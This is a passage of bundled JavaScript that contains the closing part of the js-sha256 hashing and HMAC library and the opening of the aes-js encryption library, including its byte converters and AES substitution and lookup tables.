      HEX_CHARS[(h6 >>> 20) & 0x0F] + HEX_CHARS[(h6 >>> 16) & 0x0F] +
      HEX_CHARS[(h6 >>> 12) & 0x0F] + HEX_CHARS[(h6 >>> 8) & 0x0F] +
      HEX_CHARS[(h6 >>> 4) & 0x0F] + HEX_CHARS[h6 & 0x0F];
    if (!this.is224) {
      hex += HEX_CHARS[(h7 >>> 28) & 0x0F] + HEX_CHARS[(h7 >>> 24) & 0x0F] +
        HEX_CHARS[(h7 >>> 20) & 0x0F] + HEX_CHARS[(h7 >>> 16) & 0x0F] +
        HEX_CHARS[(h7 >>> 12) & 0x0F] + HEX_CHARS[(h7 >>> 8) & 0x0F] +
        HEX_CHARS[(h7 >>> 4) & 0x0F] + HEX_CHARS[h7 & 0x0F];
    }
    return hex;
  };

  Sha256.prototype.toString = Sha256.prototype.hex;

  Sha256.prototype.digest = function () {
    this.finalize();

    var h0 = this.h0, h1 = this.h1, h2 = this.h2, h3 = this.h3, h4 = this.h4, h5 = this.h5,
      h6 = this.h6, h7 = this.h7;

    var arr = [
      (h0 >>> 24) & 0xFF, (h0 >>> 16) & 0xFF, (h0 >>> 8) & 0xFF, h0 & 0xFF,
      (h1 >>> 24) & 0xFF, (h1 >>> 16) & 0xFF, (h1 >>> 8) & 0xFF, h1 & 0xFF,
      (h2 >>> 24) & 0xFF, (h2 >>> 16) & 0xFF, (h2 >>> 8) & 0xFF, h2 & 0xFF,
      (h3 >>> 24) & 0xFF, (h3 >>> 16) & 0xFF, (h3 >>> 8) & 0xFF, h3 & 0xFF,
      (h4 >>> 24) & 0xFF, (h4 >>> 16) & 0xFF, (h4 >>> 8) & 0xFF, h4 & 0xFF,
      (h5 >>> 24) & 0xFF, (h5 >>> 16) & 0xFF, (h5 >>> 8) & 0xFF, h5 & 0xFF,
      (h6 >>> 24) & 0xFF, (h6 >>> 16) & 0xFF, (h6 >>> 8) & 0xFF, h6 & 0xFF
    ];
    if (!this.is224) {
      arr.push((h7 >>> 24) & 0xFF, (h7 >>> 16) & 0xFF, (h7 >>> 8) & 0xFF, h7 & 0xFF);
    }
    return arr;
  };

  Sha256.prototype.array = Sha256.prototype.digest;

  Sha256.prototype.arrayBuffer = function () {
    this.finalize();

    var buffer = new ArrayBuffer(this.is224 ? 28 : 32);
    var dataView = new DataView(buffer);
    dataView.setUint32(0, this.h0);
    dataView.setUint32(4, this.h1);
    dataView.setUint32(8, this.h2);
    dataView.setUint32(12, this.h3);
    dataView.setUint32(16, this.h4);
    dataView.setUint32(20, this.h5);
    dataView.setUint32(24, this.h6);
    if (!this.is224) {
      dataView.setUint32(28, this.h7);
    }
    return buffer;
  };

  function HmacSha256(key, is224, sharedMemory) {
    var i, type = typeof key;
    if (type === 'string') {
      var bytes = [], length = key.length, index = 0, code;
      for (i = 0; i < length; ++i) {
        code = key.charCodeAt(i);
        if (code < 0x80) {
          bytes[index++] = code;
        } else if (code < 0x800) {
          bytes[index++] = (0xc0 | (code >>> 6));
          bytes[index++] = (0x80 | (code & 0x3f));
        } else if (code < 0xd800 || code >= 0xe000) {
          bytes[index++] = (0xe0 | (code >>> 12));
          bytes[index++] = (0x80 | ((code >>> 6) & 0x3f));
          bytes[index++] = (0x80 | (code & 0x3f));
        } else {
          code = 0x10000 + (((code & 0x3ff) << 10) | (key.charCodeAt(++i) & 0x3ff));
          bytes[index++] = (0xf0 | (code >>> 18));
          bytes[index++] = (0x80 | ((code >>> 12) & 0x3f));
          bytes[index++] = (0x80 | ((code >>> 6) & 0x3f));
          bytes[index++] = (0x80 | (code & 0x3f));
        }
      }
      key = bytes;
    } else {
      if (type === 'object') {
        if (key === null) {
          throw new Error(ERROR);
        } else if (ARRAY_BUFFER && key.constructor === ArrayBuffer) {
          key = new Uint8Array(key);
        } else if (!Array.isArray(key)) {
          if (!ARRAY_BUFFER || !ArrayBuffer.isView(key)) {
            throw new Error(ERROR);
          }
        }
      } else {
        throw new Error(ERROR);
      }
    }

    if (key.length > 64) {
      key = (new Sha256(is224, true)).update(key).array();
    }

    var oKeyPad = [], iKeyPad = [];
    for (i = 0; i < 64; ++i) {
      var b = key[i] || 0;
      oKeyPad[i] = 0x5c ^ b;
      iKeyPad[i] = 0x36 ^ b;
    }

    Sha256.call(this, is224, sharedMemory);

    this.update(iKeyPad);
    this.oKeyPad = oKeyPad;
    this.inner = true;
    this.sharedMemory = sharedMemory;
  }
  HmacSha256.prototype = new Sha256();

  HmacSha256.prototype.finalize = function () {
    Sha256.prototype.finalize.call(this);
    if (this.inner) {
      this.inner = false;
      var innerHash = this.array();
      Sha256.call(this, this.is224, this.sharedMemory);
      this.update(this.oKeyPad);
      this.update(innerHash);
      Sha256.prototype.finalize.call(this);
    }
  };

  var exports = createMethod();
  exports.sha256 = exports;
  exports.sha224 = createMethod(true);
  exports.sha256.hmac = createHmacMethod();
  exports.sha224.hmac = createHmacMethod(true);

  if (COMMON_JS) {
    module.exports = exports;
  } else {
    root.sha256 = exports.sha256;
    root.sha224 = exports.sha224;
    if (AMD) {
      define(function () {
        return exports;
      });
    }
  }
})();


/*! MIT License. Copyright 2015-2018 Richard Moore <me@ricmoo.com>. See LICENSE.txt. */
(function(root) {
    "use strict";

    function checkInt(value) {
        return (parseInt(value) === value);
    }

    function checkInts(arrayish) {
        if (!checkInt(arrayish.length)) { return false; }

        for (var i = 0; i < arrayish.length; i++) {
            if (!checkInt(arrayish[i]) || arrayish[i] < 0 || arrayish[i] > 255) {
                return false;
            }
        }

        return true;
    }

    function coerceArray(arg, copy) {

        // ArrayBuffer view
        if (arg.buffer && arg.name === 'Uint8Array') {

            if (copy) {
                if (arg.slice) {
                    arg = arg.slice();
                } else {
                    arg = Array.prototype.slice.call(arg);
                }
            }

            return arg;
        }

        // It's an array; check it is a valid representation of a byte
        if (Array.isArray(arg)) {
            if (!checkInts(arg)) {
                throw new Error('Array contains invalid value: ' + arg);
            }

            return new Uint8Array(arg);
        }

        // Something else, but behaves like an array (maybe a Buffer? Arguments?)
        if (checkInt(arg.length) && checkInts(arg)) {
            return new Uint8Array(arg);
        }

        throw new Error('unsupported array-like object');
    }

    function createArray(length) {
        return new Uint8Array(length);
    }

    function copyArray(sourceArray, targetArray, targetStart, sourceStart, sourceEnd) {
        if (sourceStart != null || sourceEnd != null) {
            if (sourceArray.slice) {
                sourceArray = sourceArray.slice(sourceStart, sourceEnd);
            } else {
                sourceArray = Array.prototype.slice.call(sourceArray, sourceStart, sourceEnd);
            }
        }
        targetArray.set(sourceArray, targetStart);
    }



    var convertUtf8 = (function() {
        function toBytes(text) {
            var result = [], i = 0;
            text = encodeURI(text);
            while (i < text.length) {
                var c = text.charCodeAt(i++);

                // if it is a % sign, encode the following 2 bytes as a hex value
                if (c === 37) {
                    result.push(parseInt(text.substr(i, 2), 16))
                    i += 2;

                // otherwise, just the actual byte
                } else {
                    result.push(c)
                }
            }

            return coerceArray(result);
        }

        function fromBytes(bytes) {
            var result = [], i = 0;

            while (i < bytes.length) {
                var c = bytes[i];

                if (c < 128) {
                    result.push(String.fromCharCode(c));
                    i++;
                } else if (c > 191 && c < 224) {
                    result.push(String.fromCharCode(((c & 0x1f) << 6) | (bytes[i + 1] & 0x3f)));
                    i += 2;
                } else {
                    result.push(String.fromCharCode(((c & 0x0f) << 12) | ((bytes[i + 1] & 0x3f) << 6) | (bytes[i + 2] & 0x3f)));
                    i += 3;
                }
            }

            return result.join('');
        }

        return {
            toBytes: toBytes,
            fromBytes: fromBytes,
        }
    })();

    var convertHex = (function() {
        function toBytes(text) {
            var result = [];
            for (var i = 0; i < text.length; i += 2) {
                result.push(parseInt(text.substr(i, 2), 16));
            }

            return result;
        }

        // http://ixti.net/development/javascript/2011/11/11/base64-encodedecode-of-utf8-in-browser-with-js.html
        var Hex = '0123456789abcdef';

        function fromBytes(bytes) {
                var result = [];
                for (var i = 0; i < bytes.length; i++) {
                    var v = bytes[i];
                    result.push(Hex[(v & 0xf0) >> 4] + Hex[v & 0x0f]);
                }
                return result.join('');
        }

        return {
            toBytes: toBytes,
            fromBytes: fromBytes,
        }
    })();


    // Number of rounds by keysize
    var numberOfRounds = {16: 10, 24: 12, 32: 14}

    // Round constant words
    var rcon = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36, 0x6c, 0xd8, 0xab, 0x4d, 0x9a, 0x2f, 0x5e, 0xbc, 0x63, 0xc6, 0x97, 0x35, 0x6a, 0xd4, 0xb3, 0x7d, 0xfa, 0xef, 0xc5, 0x91];

    // S-box and Inverse S-box (S is for Substitution)
    var S = [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16];
    var Si =[0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e, 0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84, 0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b, 0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73, 0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4, 0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f, 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d];

    // Transformations for encryption
    var T1 = [0xc66363a5, 0xf87c7c84, 0xee777799, 0xf67b7b8d, 0xfff2f20d, 0xd66b6bbd, 0xde6f6fb1, 0x91c5c554, 0x60303050, 0x02010103, 0xce6767a9, 0x562b2b7d, 0xe7fefe19, 0xb5d7d762, 0x4dababe6, 0xec76769a, 0x8fcaca45, 0x1f82829d, 0x89c9c940, 0xfa7d7d87, 0xeffafa15, 0xb25959eb, 0x8e4747c9, 0xfbf0f00b, 0x41adadec, 0xb3d4d467, 0x5fa2a2fd, 0x45afafea, 0x239c9cbf, 0x53a4a4f7, 0xe4727296, 0x9bc0c05b, 0x75b7b7c2, 0xe1fdfd1c, 0x3d9393ae, 0x4c26266a, 0x6c36365a, 0x7e3f3f41, 0xf5f7f702, 0x83cccc4f, 0x6834345c, 0x51a5a5f4, 0xd1e5e534, 0xf9f1f108, 0xe2717193, 0xabd8d873, 0x62313153, 0x2a15153f, 0x0804040c, 0x95c7c752, 0x46232365, 0x9dc3c35e, 0x30181828, 0x379696a1, 0x0a05050f, 0x2f9a9ab5, 0x0e070709, 0x24121236, 0x1b80809b, 0xdfe2e23d, 0xcdebeb26, 0x4e272769, 0x7fb2b2cd, 0xea75759f, 0x1209091b, 0x1d83839e, 0x582c2c74, 0x341a1a2e, 0x361b1b2d, 0xdc6e6eb2, 0xb45a5aee, 0x5ba0a0fb, 0xa45252f6, 0x763b3b4d, 0xb7d6d661, 0x7db3b3ce, 0x5229297b, 0xdde3e33e, 0x5e2f2f71, 0x13848497, 0xa65353f5, 0xb9d1d168, 0x00000000, 0xc1eded2c, 0x40202060, 0xe3fcfc1f, 0x79b1b1c8, 0xb65b5bed, 0xd46a6abe, 0x8dcbcb46, 0x67bebed9, 0x7239394b, 0x944a4ade, 0x984c4cd4, 0xb05858e8, 0x85cfcf4a, 0xbbd0d06b, 0xc5efef2a, 0x4faaaae5, 0xedfbfb16, 0x864343c5, 0x9a4d4dd7, 0x66333355, 0x11858594, 0x8a4545cf, 0xe9f9f910, 0x04020206, 0xfe7f7f81, 0xa05050f0, 0x783c3c44, 0x259f9fba, 0x4ba8a8e3, 0xa25151f3, 0x5da3a3fe, 0x804040c0, 0x058f8f8a, 0x3f9292ad, 0x219d9dbc, 0x70383848, 0xf1f5f504, 0x63bcbcdf, 0x77b6b6c1, 0xafdada75, 0x42212163, 0x20101030, 0xe5ffff1a, 0xfdf3f30e, 0xbfd2d26d, 0x81cdcd4c, 0x180c0c14, 0x26131335, 0xc3ecec2f, 0xbe5f5fe1, 0x359797a2, 0x884444cc, 0x2e171739, 0x93c4c457, 0x55a7a7f2, 0xfc7e7e82, 0x7a3d3d47, 0xc86464ac, 0xba5d5de7, 0x3219192b, 0xe6737395, 0xc06060a0, 0x19818198, 0x9e4f4fd1, 0xa3dcdc7f, 0x44222266, 0x542a2a7e, 0x3b9090ab, 0x0b888883, 0x8c4646ca, 0xc7eeee29, 0x6bb8b8d3, 0x2814143c, 0xa7dede79, 0xbc5e5ee2, 0x160b0b1d, 0xaddbdb76, 0xdbe0e03b, 0x64323256, 0x743a3a4e, 0x140a0a1e, 0x924949db, 0x0c06060a, 0x4824246c, 0xb85c5ce4, 0x9fc2c25d, 0xbdd3d36e, 0x43acacef, 0xc46262a6, 0x399191a8, 0x319595a4, 0xd3e4e437, 0xf279798b, 0xd5e7e732, 0x8bc8c843, 0x6e373759, 0xda6d6db7, 0x018d8d8c, 0xb1d5d564, 0x9c4e4ed2, 0x49a9a9e0, 0xd86c6cb4, 0xac5656fa, 0xf3f4f407, 0xcfeaea25, 0xca6565af, 0xf47a7a8e, 0x47aeaee9, 0x10080818, 0x6fbabad5, 0xf0787888, 0x4a25256f, 0x5c2e2e72, 0x381c1c24, 0x57a6a6f1, 0x73b4b4c7, 0x97c6c651, 0xcbe8e823, 0xa1dddd7c, 0xe874749c, 0x3e1f1f21, 0x964b4bdd, 0x61bdbddc, 0x0d8b8b86, 0x0f8a8a85, 0xe0707090, 0x7c3e3e42, 0x71b5b5c4, 0xcc6666aa, 0x904848d8, 0x06030305, 0xf7f6f601, 0x1c0e0e12, 0xc26161a3, 0x6a35355f, 0xae5757f9, 0x69b9b9d0, 0x17868691, 0x99c1c158, 0x3a1d1d27, 0x279e9eb9, 0xd9e1e138, 0xebf8f813, 0x2b9898b3, 0x22111133, 0xd26969bb, 0xa9d9d970, 0x078e8e89, 0x339494a7, 0x2d9b9bb6, 0x3c1e1e22, 0x15878792, 0xc9e9e920, 0x87cece49, 0xaa5555ff, 0x50282878, 0xa5dfdf7a, 0x038c8c8f, 0x59a1a1f8, 0x09898980, 0x1a0d0d17, 0x65bfbfda, 0xd7e6e631, 0x844242c6, 0xd06868b8, 0x824141c3, 0x299999b0, 0x5a2d2d77, 0x1e0f0f11, 0x7bb0b0cb, 0xa85454fc, 0x6dbbbbd6, 0x2c16163a];
    var T2 = [0xa5c66363, 0x84f87c7c, 0x99ee7777, 0x8df67b7b, 0x0dfff2f2, 0xbdd66b6b, 0xb1de6f6f, 0x5491c5c5, 0x50603030, 0x03020101, 0xa9ce6767, 0x7d562b2b, 0x19e7fefe, 0x62b5d7d7, 0xe64dabab, 0x9aec7676, 0x458fcaca, 0x9d1f8282, 0x4089c9c9, 0x87fa7d7d, 0x15effafa, 0xebb25959, 0xc98e4747, 0x0bfbf0f0, 0xec41adad, 0x67b3d4d4, 0xfd5fa2a2, 0xea45afaf, 0xbf239c9c, 0xf753a4a4, 0x96e47272, 0x5b9bc0c0, 0xc275b7b7, 0x1ce1fdfd, 0xae3d9393, 0x6a4c2626, 0x5a6c3636, 0x417e3f3f, 0x02f5f7f7, 0x4f83cccc, 0x5c683434, 0xf451a5a5, 0x34d1e5e5, 0x08f9f1f1, 0x93e27171, 0x73abd8d8, 0x53623131, 0x3f2a1515, 0x0c080404, 0x5295c7c7, 0x65462323, 0x5e9dc3c3, 0x28301818, 0xa1379696, 0x0f0a0505, 0xb52f9a9a, 0x090e0707, 0x36241212, 0x9b1b8080, 0x3ddfe2e2, 0x26cdebeb, 0x694e2727, 0xcd7fb2b2, 0x9fea7575, 0x1b120909, 0x9e1d8383, 0x74582c2c, 0x2e341a1a, 0x2d361b1b, 0xb2dc6e6e, 0xeeb45a5a, 0xfb5ba0a0, 0xf6a45252, 0x4d763b3b, 0x61b7d6d6, 0xce7db3b3, 0x7b522929, 0x3edde3e3, 0x715e2f2f, 0x97138484, 0xf5a65353, 0x68b9d1d1, 0x00000000, 0x2cc1eded, 0x60402020, 0x1fe3fcfc, 0xc879b1b1, 0xedb65b5b, 0xbed46a6a, 0x468dcbcb, 0xd967bebe, 0x4b723939, 0xde944a4a, 0xd4984c4c, 0xe8b05858, 0x4a85cfcf, 0x6bbbd0d0, 0x2ac5efef, 0xe54faaaa, 0x16edfbfb, 0xc5864343, 0xd79a4d4d, 0x55663333, 0x94118585, 0xcf8a4545, 0x10e9f9f9, 0x06040202, 0x81fe7f7f, 0xf0a05050, 0x44783c3c, 0xba259f9f, 0xe34ba8a8, 0xf3a25151, 0xfe5da3a3, 0xc0804040, 0x8a058f8f, 0xad3f9292, 0xbc219d9d, 0x48703838, 0x04f1f5f5, 0xdf63bcbc, 0xc177b6b6, 0x75afdada, 0x63422121, 0x30201010, 0x1ae5ffff, 0x0efdf3f3, 0x6dbfd2d2, 0x4c81cdcd, 0x14180c0c, 0x35261313, 0x2fc3ecec, 0xe1be5f5f, 0xa2359797, 0xcc884444, 0x392e1717, 0x5793c4c4, 0xf255a7a7, 0x82fc7e7e, 0x477a3d3d, 0xacc86464, 0xe7ba5d5d, 0x2b321919, 0x95e67373, 0xa0c06060, 0x98198181, 0xd19e4f4f, 0x7fa3dcdc, 0x66442222, 0x7e542a2a, 0xab3b9090, 0x830b8888, 0xca8c4646, 0x29c7eeee, 0xd36bb8b8, 0x3c281414, 0x79a7dede, 0xe2bc5e5e, 0x1d160b0b, 0x76addbdb, 0x3bdbe0e0, 0x56643232, 0x4e743a3a, 0x1e140a0a, 0xdb924949, 0x0a0c0606, 0x6c482424, 0xe4b85c5c, 0x5d9fc2c2, 0x6ebdd3d3, 0xef43acac, 0xa6c46262, 0xa8399191, 0xa4319595, 0x37d3e4e4, 0x8bf27979, 0x32d5e7e7, 0x438bc8c8, 0x596e3737, 0xb7da6d6d, 0x8c018d8d, 0x64b1d5d5, 0xd29c4e4e, 0xe049a9a9, 0xb4d86c6c, 0xfaac5656, 0x07f3f4f4, 0x25cfeaea, 0xafca6565, 0x8ef47a7a, 0xe947aeae, 0x18100808, 0xd56fbaba, 0x88f07878, 0x6f4a2525, 0x725c2e2e, 0x24381c1c, 0xf157a6a6, 0xc773b4b4, 0x5197c6c6, 0x23cbe8e8, 0x7ca1dddd, 0x9ce87474, 0x213e1f1f, 0xdd964b4b, 0xdc61bdbd, 0x860d8b8b, 0x850f8a8a, 0x90e07070, 0x427c3e3e, 0xc471b5b5, 0xaacc6666, 0xd8904848, 0x05060303, 0x01f7f6f6, 0x121c0e0e, 0xa3c26161, 0x5f6a3535, 0xf9ae5757, 0xd069b9b9, 0x91178686, 0x5899c1c1, 0x273a1d1d, 0xb9279e9e, 0x38d9e1e1, 0x13ebf8f8, 0xb32b9898, 0x33221111, 0xbbd26969, 0x70a9d9d9, 0x89078e8e, 0xa7339494, 0xb62d9b9b, 0x223c1e1e, 0x92158787, 0x20c9e9e9, 0x4987cece, 0xffaa5555, 0x78502828, 0x7aa5dfdf, 0x8f038c8c, 0xf859a1a1, 0x80098989, 0x171a0d0d, 0xda65bfbf, 0x31d7e6e6, 0xc6844242, 0xb8d06868, 0xc3824141, 0xb0299999, 0x775a2d2d, 0x111e0f0f, 0xcb7bb0b0, 0xfca85454, 0xd66dbbbb, 0x3a2c1616];
    var T3 = [0x63a5c663, 0x7c84f87c, 0x7799ee77, 0x7b8df67b, 0xf20dfff2, 0x6bbdd66b, 0x6fb1de6f, 0xc55491c5, 0x30506030, 0x01030201, 0x67a9ce67, 0x2b7d562b, 0xfe19e7fe, 0xd762b5d7, 0xabe64dab, 0x769aec76, 0xca458fca, 0x829d1f82, 0xc94089c9, 0x7d87fa7d, 0xfa15effa, 0x59ebb259, 0x47c98e47, 0xf00bfbf0, 0xadec41ad, 0xd467b3d4, 0xa2fd5fa2, 0xafea45af, 0x9cbf239c, 0xa4f753a4, 0x7296e472, 0xc05b9bc0, 0xb7c275b7, 0xfd1ce1fd, 0x93ae3d93, 0x266a4c26, 0x365a6c36, 0x3f417e3f, 0xf702f5f7, 0xcc4f83cc, 0x345c6834, 0xa5f451a5, 0xe534d1e5, 0xf108f9f1, 0x7193e271, 0xd873abd8, 0x31536231, 0x153f2a15, 0x040c0804, 0xc75295c7, 0x23654623, 0xc35e9dc3, 0x18283018, 0x96a13796, 0x050f0a05, 0x9ab52f9a, 0x07090e07, 0x12362412, 0x809b1b80, 0xe23ddfe2, 0xeb26cdeb, 0x27694e27, 0xb2cd7fb2, 0x759fea75, 0x091b1209, 0x839e1d83, 0x2c74582c, 0x1a2e341a, 0x1b2d361b, 0x6eb2dc6e, 0x5aeeb45a, 0xa0fb5ba0, 0x52f6a452, 0x3b4d763b, 0xd661b7d6, 0xb3ce7db3, 0x297b5229, 0xe33edde3, 0x2f715e2f, 0x84971384, 0x53f5a653, 0xd168b9d1, 0x00000000, 0xed2cc1ed, 0x20604020, 0xfc1fe3fc, 0xb1c879b1, 0x5bedb65b, 0x6abed46a, 0xcb468dcb, 0xbed967be, 0x394b7239, 0x4ade944a, 0x4cd4984c, 0x58e8b058, 0xcf4a85cf, 0xd06bbbd0, 0xef2ac5ef, 0xaae54faa, 0xfb16edfb, 0x43c58643, 0x4dd79a4d, 0x33556633, 0x85941185, 0x45cf8a45, 0xf910e9f9, 0x02060402, 0x7f81fe7f, 0x50f0a050, 0x3c44783c, 0x9fba259f, 0xa8e34ba8, 0x51f3a251, 0xa3fe5da3, 0x40c08040, 0x8f8a058f, 0x92ad3f92, 0x9dbc219d, 0x38487038, 0xf504f1f5, 0xbcdf63bc, 0xb6c177b6, 0xda75afda, 0x21634221, 0x10302010, 0xff1ae5ff, 0xf30efdf3, 0xd26dbfd2, 0xcd4c81cd, 0x0c14180c, 0x13352613, 0xec2fc3ec, 0x5fe1be5f, 0x97a23597, 0x44cc8844, 0x17392e17, 0xc45793c4, 0xa7f255a7, 0x7e82fc7e, 0x3d477a3d, 0x64acc864, 0x5de7ba5d, 0x192b3219, 0x7395e673, 0x60a0c060, 0x81981981, 0x4fd19e4f, 0xdc7fa3dc, 0x22664422, 0x2a7e542a, 0x90ab3b90, 0x88830b88, 0x46ca8c46, 0xee29c7ee, 0xb8d36bb8, 0x143c2814, 0xde79a7de, 0x5ee2bc5e, 0x0b1d160b, 0xdb76addb, 0xe03bdbe0, 0x32566432, 0x3a4e743a, 0x0a1e140a, 0x49db9249, 0x060a0c06, 0x246c4824, 0x5ce4b85c, 0xc25d9fc2, 0xd36ebdd3, 0xacef43ac, 0x62a6c462, 0x91a83991, 0x95a43195, 0xe437d3e4, 0x798bf279, 0xe732d5e7, 0xc8438bc8, 0x37596e37, 0x6db7da6d, 0x8d8c018d, 0xd564b1d5, 0x4ed29c4e, 0xa9e049a9, 0x6cb4d86c, 0x56faac56, 0xf407f3f4, 0xea25cfea, 0x65afca65, 0x7a8ef47a, 0xaee947ae, 0x08181008, 0xbad56fba, 0x7888f078, 0x256f4a25, 0x2e725c2e, 0x1c24381c, 0xa6f157a6, 0xb4c773b4, 0xc65197c6, 0xe823cbe8, 0xdd7ca1dd, 0x749ce874, 0x1f213e1f, 0x4bdd964b, 0xbddc61bd, 0x8b860d8b, 0x8a850f8a, 0x7090e070, 0x3e427c3e, 0xb5c471b5, 0x66aacc66, 0x48d89048, 0x03050603, 0xf601f7f6, 0x0e121c0e, 0x61a3c261, 0x355f6a35, 0x57f9ae57, 0xb9d069b9, 0x86911786, 0xc15899c1, 0x1d273a1d, 0x9eb9279e, 0xe138d9e1, 0xf813ebf8, 0x98b32b98, 0x11332211, 0x69bbd269, 0xd970a9d9, 0x8e89078e, 0x94a73394, 0x9bb62d9b, 0x1e223c1e, 0x87921587, 0xe920c9e9, 0xce4987ce, 0x55ffaa55, 0x28785028, 0xdf7aa5df, 0x8c8f038c, 0xa1f859a1, 0x89800989, 0x0d171a0d, 0xbfda65bf, 0xe631d7e6, 0x42c68442, 0x68b8d068, 0x41c38241, 0x99b02999, 0x2d775a2d, 0x0f111e0f, 0xb0cb7bb0, 0x54fca854, 0xbbd66dbb, 0x163a2c16];
